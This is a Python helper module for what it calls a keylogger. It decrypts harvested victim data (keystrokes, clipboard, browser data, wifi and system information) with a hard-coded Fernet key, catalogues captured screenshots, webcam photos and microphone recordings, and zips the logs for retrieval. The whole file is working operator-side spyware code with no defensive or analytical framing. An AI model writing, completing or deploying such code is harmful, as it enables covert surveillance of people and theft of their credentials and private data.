import os
import re
import pathlib
import subprocess
import bcrypt
import zipfile
import io
from cryptography.fernet import Fernet

# Security utility functions
def hash_password(password):
    """Hash a password using bcrypt"""
    salt = bcrypt.gensalt()
    hashed = bcrypt.hashpw(password.encode('utf-8'), salt)
    return hashed

def check_password(plain_password, hashed_password):
    """Verify a password against a hash"""
    return bcrypt.checkpw(plain_password.encode('utf-8'), hashed_password)

# File management utilities
def ensure_logs_directory():
    """Ensure the logs directory exists"""
    log_path = 'C:/Users/Public/Logs'
    pathlib.Path(log_path).mkdir(parents=True, exist_ok=True)
    pathlib.Path(f'{log_path}/Screenshots').mkdir(parents=True, exist_ok=True)
    pathlib.Path(f'{log_path}/WebcamPics').mkdir(parents=True, exist_ok=True)
    return log_path

def decrypt_files(log_path):
    """Run the decryption on files in the logs directory"""
    encrypted_files = ['e_network_wifi.txt', 'e_system_info.txt', 'e_clipboard_info.txt', 
                        'e_browser.txt', 'e_key_logs.txt']
    regex = re.compile(r'.+\.xml$')
    
    # Check for any xml files
    for dirpath, dirnames, filenames in os.walk(log_path):
        for file in filenames:
            if regex.match(file):
                encrypted_files.append(file)
    
    # Decryption key from the keylogger
    key = b'MujBTqtZ4QCQW_fmlMHVWBmTVRW8IGZSuxFctu_D3d0='
    
    successfully_decrypted = []
    
    for file_decrypt in encrypted_files:
        full_path = os.path.join(log_path, file_decrypt)
        
        # Skip if file doesn't exist
        if not os.path.exists(full_path):
            continue
            
        try:
            with open(full_path, 'rb') as f:
                data = f.read()
            
            # Decrypt the data
            decrypted = Fernet(key).decrypt(data)
            
            # Write decrypted data to a new file
            output_file = os.path.join(log_path, file_decrypt[2:]) if file_decrypt.startswith('e_') else full_path
            with open(output_file, 'wb') as f:
                f.write(decrypted)
            
            # Remove the encrypted file
            os.remove(full_path)
            successfully_decrypted.append(file_decrypt)
        except Exception as e:
            print(f"Error decrypting {file_decrypt}: {str(e)}")
    
    return successfully_decrypted

def create_zip_of_logs(log_path):
    """Create a zip file containing all logs"""
    memory_file = io.BytesIO()
    
    with zipfile.ZipFile(memory_file, 'w', zipfile.ZIP_DEFLATED) as zf:
        # Walk the directory and add all files
        for root, dirs, files in os.walk(log_path):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, log_path)
                try:
                    zf.write(file_path, arcname)
                except Exception as e:
                    print(f"Error adding {file_path} to zip: {str(e)}")
    
    memory_file.seek(0)
    return memory_file

def get_log_files(log_path, category=None):
    """Get log files by category"""
    if not os.path.exists(log_path):
        return []
        
    if category == "keylogs":
        pattern = "key_logs.txt"
    elif category == "screenshots":
        return [os.path.join(log_path, 'Screenshots', f) for f in os.listdir(os.path.join(log_path, 'Screenshots')) 
                if f.endswith('.png')]
    elif category == "webcam":
        return [os.path.join(log_path, 'WebcamPics', f) for f in os.listdir(os.path.join(log_path, 'WebcamPics')) 
                if f.endswith('.jpg')]
    elif category == "microphone":
        return [f for f in os.listdir(log_path) if f.endswith('.wav')]
    elif category == "system":
        return [os.path.join(log_path, f) for f in os.listdir(log_path) 
                if f in ['system_info.txt', 'network_wifi.txt', 'clipboard_info.txt']]
    elif category == "browser":
        return [os.path.join(log_path, 'browser.txt')] if os.path.exists(os.path.join(log_path, 'browser.txt')) else []
    else:
        return [os.path.join(log_path, f) for f in os.listdir(log_path)]
    
    matches = [os.path.join(log_path, f) for f in os.listdir(log_path) if pattern in f]
    return matches

def read_file_content(file_path):
    """Read the content of a file as text"""
    try:
        with open(file_path, 'r', encoding='utf-8', errors='replace') as f:
            return f.read()
    except Exception as e:
        return f"Error reading file: {str(e)}"
